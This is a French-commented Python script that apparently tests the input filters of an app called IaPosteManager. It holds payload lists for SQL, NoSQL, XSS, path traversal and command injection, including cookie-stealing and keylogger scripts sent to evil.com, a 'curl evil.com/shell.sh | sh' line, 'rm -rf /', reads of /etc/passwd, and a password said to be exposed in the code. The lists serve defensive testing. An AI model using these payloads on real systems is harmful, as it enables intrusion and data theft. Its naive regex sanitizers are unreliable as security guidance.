#!/usr/bin/env python3
"""
🛡️ Script de Simulation d'Attaques - IaPosteManager
====================================================

Ce script simule différents types d'attaques pour tester la robustesse du code.
À exécuter UNIQUEMENT en environnement de développement/test.

Usage: python security/attack-simulation.py [--target localhost:5000]
"""

import argparse
import json
import re
import sys
import time
from datetime import datetime
from typing import Any

# Couleurs pour le terminal
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'


def log_attack(attack_name: str, status: str, details: str = ""):
    """Log une tentative d'attaque avec couleur."""
    timestamp = datetime.now().strftime("%H:%M:%S")
    if status == "BLOCKED":
        color = Colors.GREEN
        icon = "✅"
    elif status == "VULNERABLE":
        color = Colors.RED
        icon = "🔴"
    else:
        color = Colors.YELLOW
        icon = "⚠️"

    print(f"{Colors.CYAN}[{timestamp}]{Colors.RESET} {icon} {color}{attack_name}{Colors.RESET}")
    if details:
        print(f"         └─ {details}")


def banner():
    """Affiche la bannière."""
    print(f"""
{Colors.RED}╔══════════════════════════════════════════════════════════════╗
║  🛡️  SIMULATION D'ATTAQUES - IaPosteManager Security Test   ║
║                                                                ║
║  ⚠️  USAGE EN DÉVELOPPEMENT UNIQUEMENT                        ║
╚══════════════════════════════════════════════════════════════╝{Colors.RESET}
""")


# ============================================
# ATTAQUES PAR INJECTION SQL
# ============================================

SQL_INJECTION_PAYLOADS = [
    # Classic SQL Injection
    "' OR '1'='1",
    "' OR '1'='1' --",
    "'; DROP TABLE users; --",
    "1' AND '1'='1",
    "admin'--",

    # Union-based
    "' UNION SELECT null, null, null --",
    "' UNION SELECT username, password FROM users --",

    # Time-based blind
    "' OR SLEEP(5) --",
    "'; WAITFOR DELAY '0:0:5' --",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",

    # Error-based
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --",

    # Second-order
    "admin'; UPDATE users SET role='admin' WHERE username='attacker'; --",
]


def test_sql_injection(payload: str) -> dict:
    """Teste un payload d'injection SQL."""
    # Patterns dangereux à détecter
    dangerous_patterns = [
        r"(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER)\b)",
        r"(--)|(;)",
        r"('.*OR.*')",
        r"(SLEEP|WAITFOR|DELAY)",
        r"(EXTRACTVALUE|UPDATEXML)",
    ]

    for pattern in dangerous_patterns:
        if re.search(pattern, payload, re.IGNORECASE):
            return {"blocked": True, "pattern": pattern}

    return {"blocked": False, "payload": payload}


# ============================================
# ATTAQUES XSS (Cross-Site Scripting)
# ============================================

XSS_PAYLOADS = [
    # Basiques
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',

    # Event handlers
    '<body onload=alert("XSS")>',
    '<div onmouseover=alert("XSS")>hover me</div>',

    # Encodés
    '&lt;script&gt;alert("XSS")&lt;/script&gt;',
    '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',

    # Bypass de filtres
    '<scr<script>ipt>alert("XSS")</script>',
    '<SCRIPT>alert("XSS")</SCRIPT>',
    'javascript:alert("XSS")',

    # DOM-based
    '<img src="x" onerror="eval(atob(\'YWxlcnQoMSk=\'))">',

    # Cookie stealing
    '<script>document.location="https://evil.com/?c="+document.cookie</script>',

    # Keylogger
    '<script>document.onkeypress=function(e){new Image().src="https://evil.com?k="+e.key;}</script>',
]


def sanitize_html(html: str) -> str:
    """Nettoie le HTML des scripts malveillants."""
    import html as html_lib

    # Échappe les caractères HTML
    sanitized = html_lib.escape(html)

    # Supprime les patterns dangereux
    dangerous_patterns = [
        r'<script[^>]*>.*?</script>',
        r'javascript:',
        r'on\w+\s*=',
        r'<iframe[^>]*>',
        r'<object[^>]*>',
        r'<embed[^>]*>',
    ]

    for pattern in dangerous_patterns:
        sanitized = re.sub(pattern, '', sanitized, flags=re.IGNORECASE | re.DOTALL)

    return sanitized


def test_xss(payload: str) -> dict:
    """Teste un payload XSS."""
    sanitized = sanitize_html(payload)

    # Vérifie si le payload a été neutralisé
    dangerous_indicators = ['<script', 'onerror=', 'onload=', 'javascript:', 'onclick=']

    is_safe = not any(indicator in sanitized.lower() for indicator in dangerous_indicators)

    return {
        "original": payload,
        "sanitized": sanitized,
        "is_safe": is_safe
    }


# ============================================
# ATTAQUES AUTHENTIFICATION
# ============================================

BRUTE_FORCE_PASSWORDS = [
    "admin123",
    "password",
    "123456",
    "admin",
    "root",
    "password123",
    "letmein",
    "welcome",
    "monkey",
    "dragon",
    "master",
    "login",
    "princess",
    "qwerty123",
    "abc123",
    "Admin@123",
    "Password1",
    "Admin2024!",
    "SuperAdmin2026!",  # Celui exposé dans le code!
]


def check_password_strength(password: str) -> dict:
    """Vérifie la force d'un mot de passe."""
    score = 0
    feedback = []

    if len(password) >= 8:
        score += 1
    else:
        feedback.append("Doit contenir au moins 8 caractères")

    if len(password) >= 12:
        score += 1

    if re.search(r'[a-z]', password):
        score += 1
    else:
        feedback.append("Doit contenir des minuscules")

    if re.search(r'[A-Z]', password):
        score += 1
    else:
        feedback.append("Doit contenir des majuscules")

    if re.search(r'\d', password):
        score += 1
    else:
        feedback.append("Doit contenir des chiffres")

    if re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
        score += 1
    else:
        feedback.append("Doit contenir des caractères spéciaux")

    # Vérifie si c'est un mot de passe courant
    common_passwords = set(BRUTE_FORCE_PASSWORDS)
    if password in common_passwords:
        score = 0
        feedback.append("⚠️ MOT DE PASSE COMMUN - TRÈS VULNÉRABLE!")

    strength = "FAIBLE" if score < 3 else ("MOYEN" if score < 5 else "FORT")

    return {
        "password": password[:3] + "***",
        "score": score,
        "max_score": 6,
        "strength": strength,
        "feedback": feedback
    }


# ============================================
# ATTAQUES PATH TRAVERSAL
# ============================================

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd%00.png",
    "....//....//....//etc/shadow",
]


def test_path_traversal(path: str) -> dict:
    """Teste un payload de path traversal."""
    import os

    # Normalise le chemin
    normalized = os.path.normpath(path)

    # Détecte les patterns dangereux
    dangerous = False
    if '..' in path or '%2e' in path.lower():
        dangerous = True
    if path.startswith('/') and not path.startswith('/app/'):
        dangerous = True

    return {
        "original": path,
        "normalized": normalized,
        "blocked": dangerous
    }


# ============================================
# ATTAQUES NOSQL INJECTION
# ============================================

NOSQL_INJECTION_PAYLOADS = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "sleep(5000)"}',
    '{"$regex": ".*"}',
    'true, $where: "1 == 1"',
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
]


def test_nosql_injection(payload: str) -> dict:
    """Teste un payload NoSQL injection."""
    dangerous_operators = ['$gt', '$ne', '$lt', '$gte', '$lte', '$where', '$regex', '$exists']

    is_dangerous = any(op in payload for op in dangerous_operators)

    return {
        "payload": payload,
        "blocked": is_dangerous,
        "operators_found": [op for op in dangerous_operators if op in payload]
    }


# ============================================
# ATTAQUES COMMAND INJECTION
# ============================================

COMMAND_INJECTION_PAYLOADS = [
    "; cat /etc/passwd",
    "| ls -la",
    "`id`",
    "$(whoami)",
    "&& rm -rf /",
    "|| curl https://evil.com/shell.sh | sh",
    "\n/bin/sh -i",
]


def test_command_injection(input_str: str) -> dict:
    """Teste un payload d'injection de commande."""
    dangerous_chars = [';', '|', '`', '$', '&', '\n', '>', '<']
    dangerous_commands = ['cat', 'ls', 'rm', 'curl', 'wget', 'sh', 'bash', 'python', 'perl']

    found_chars = [c for c in dangerous_chars if c in input_str]
    found_commands = [cmd for cmd in dangerous_commands if cmd in input_str.lower()]

    return {
        "input": input_str,
        "blocked": bool(found_chars or found_commands),
        "dangerous_chars": found_chars,
        "dangerous_commands": found_commands
    }


# ============================================
# RAPPORT FINAL
# ============================================

def run_all_tests():
    """Exécute tous les tests de sécurité."""
    banner()

    results = {
        "timestamp": datetime.now().isoformat(),
        "sql_injection": {"tested": 0, "blocked": 0},
        "xss": {"tested": 0, "blocked": 0},
        "auth": {"tested": 0, "weak": 0},
        "path_traversal": {"tested": 0, "blocked": 0},
        "nosql_injection": {"tested": 0, "blocked": 0},
        "command_injection": {"tested": 0, "blocked": 0},
    }

    # Tests SQL Injection
    print(f"\n{Colors.BOLD}=== TEST 1: Injection SQL ==={Colors.RESET}")
    for payload in SQL_INJECTION_PAYLOADS:
        result = test_sql_injection(payload)
        results["sql_injection"]["tested"] += 1
        status = "BLOCKED" if result["blocked"] else "VULNERABLE"
        if result["blocked"]:
            results["sql_injection"]["blocked"] += 1
        log_attack(f"SQL Injection: {payload[:40]}...", status)

    # Tests XSS
    print(f"\n{Colors.BOLD}=== TEST 2: Cross-Site Scripting (XSS) ==={Colors.RESET}")
    for payload in XSS_PAYLOADS[:5]:  # Limité pour la démo
        result = test_xss(payload)
        results["xss"]["tested"] += 1
        status = "BLOCKED" if result["is_safe"] else "VULNERABLE"
        if result["is_safe"]:
            results["xss"]["blocked"] += 1
        log_attack(f"XSS: {payload[:40]}...", status)

    # Tests Force de mot de passe
    print(f"\n{Colors.BOLD}=== TEST 3: Analyse des mots de passe ==={Colors.RESET}")
    for password in BRUTE_FORCE_PASSWORDS[:8]:
        result = check_password_strength(password)
        results["auth"]["tested"] += 1
        status = "BLOCKED" if result["strength"] == "FORT" else "VULNERABLE"
        if result["strength"] != "FORT":
            results["auth"]["weak"] += 1
        log_attack(f"Password: {result['password']} ({result['strength']})", status)

    # Tests Path Traversal
    print(f"\n{Colors.BOLD}=== TEST 4: Path Traversal ==={Colors.RESET}")
    for payload in PATH_TRAVERSAL_PAYLOADS:
        result = test_path_traversal(payload)
        results["path_traversal"]["tested"] += 1
        status = "BLOCKED" if result["blocked"] else "VULNERABLE"
        if result["blocked"]:
            results["path_traversal"]["blocked"] += 1
        log_attack(f"Path: {payload[:40]}...", status)

    # Tests NoSQL Injection
    print(f"\n{Colors.BOLD}=== TEST 5: NoSQL Injection ==={Colors.RESET}")
    for payload in NOSQL_INJECTION_PAYLOADS:
        result = test_nosql_injection(payload)
        results["nosql_injection"]["tested"] += 1
        status = "BLOCKED" if result["blocked"] else "VULNERABLE"
        if result["blocked"]:
            results["nosql_injection"]["blocked"] += 1
        log_attack(f"NoSQL: {payload[:40]}...", status)

    # Tests Command Injection
    print(f"\n{Colors.BOLD}=== TEST 6: Command Injection ==={Colors.RESET}")
    for payload in COMMAND_INJECTION_PAYLOADS:
        result = test_command_injection(payload)
        results["command_injection"]["tested"] += 1
        status = "BLOCKED" if result["blocked"] else "VULNERABLE"
        if result["blocked"]:
            results["command_injection"]["blocked"] += 1
        log_attack(f"Command: {payload[:40]}...", status)

    # Résumé
    print(f"\n{Colors.BOLD}{'='*60}")
    print(f"📊 RÉSUMÉ DES TESTS DE SÉCURITÉ")
    print(f"{'='*60}{Colors.RESET}")

    total_tested = sum(r["tested"] for r in results.values() if isinstance(r, dict) and "tested" in r)
    total_blocked = sum(r.get("blocked", 0) for r in results.values() if isinstance(r, dict))

    print(f"  Total des tests: {total_tested}")
    print(f"  Attaques bloquées: {total_blocked}")
    print(f"  Taux de protection: {(total_blocked/total_tested*100):.1f}%")

    # Sauvegarde du rapport
    with open('security/attack-simulation-results.json', 'w') as f:
        json.dump(results, f, indent=2)

    print(f"\n{Colors.GREEN}✅ Rapport sauvegardé: security/attack-simulation-results.json{Colors.RESET}\n")

    return results


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simulation d'attaques de sécurité")
    parser.add_argument("--target", default="localhost:5000", help="Cible (host:port)")
    parser.add_argument("--type", choices=["sql", "xss", "auth", "path", "nosql", "cmd", "all"],
                       default="all", help="Type d'attaque à simuler")

    args = parser.parse_args()

    run_all_tests()
